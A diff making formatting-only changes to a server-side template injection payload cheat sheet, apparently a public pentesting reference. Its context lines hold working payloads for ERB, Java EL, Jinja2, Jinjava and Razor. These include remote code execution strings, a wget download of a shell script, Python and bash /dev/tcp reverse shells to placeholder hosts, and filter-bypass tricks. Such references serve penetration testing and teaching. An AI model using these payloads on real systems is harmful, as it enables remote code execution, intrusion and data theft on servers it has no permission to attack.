@@ -104,7 +104,6 @@ Execute code using SSTI for ERB engine.
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
 
-
 Execute code using SSTI for Slim engine.
 
 ```powershell
@@ -142,12 +141,11 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ### Basic injection
 
 ```java
-${1+1} 
+${1+1}
 #{1+1}
 ```
 
 ### Code Execution
-
 
 ```java
 // Common RCE payloads
@@ -176,7 +174,6 @@ ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().g
 // Method using ScriptEngineManager
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
 ```
-
 
 ## Twig
 
@@ -377,7 +374,8 @@ Listen for connexion
 nv -lnvp 8000
 ```
 
-#### Exploit the SSTI by calling subprocess.Popen.
+#### Exploit the SSTI by calling subprocess.Popen
+
 :warning: the number 396 will vary depending of the application.
 
 ```python
@@ -391,26 +389,25 @@ nv -lnvp 8000
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+Simply modification of payload to clean up output and facilitate command input (<https://twitter.com/SecGus/status/1198976764351066113>)
 In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 ```
 
-#### Exploit the SSTI by writing an evil config file.
+#### Exploit the SSTI by writing an evil config file
 
 ```python
 # evil config
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
 
 # load the evil config
 {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
 
 # connect to evil host
-{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
-
 
 ### Filter bypass
 
@@ -445,7 +442,8 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
-Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by <https://twitter.com/SecGus>:
+
 ```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
@@ -461,9 +459,9 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 
 Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
 
-### Command execution 
+### Command execution
 
-Fixed by https://github.com/HubSpot/jinjava/pull/230
+Fixed by <https://github.com/HubSpot/jinjava/pull/230>
 
 ```python
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
@@ -484,7 +482,7 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 @(1+2)
 ```
 
-### Command execution 
+### Command execution
 
 ```csharp
 @{
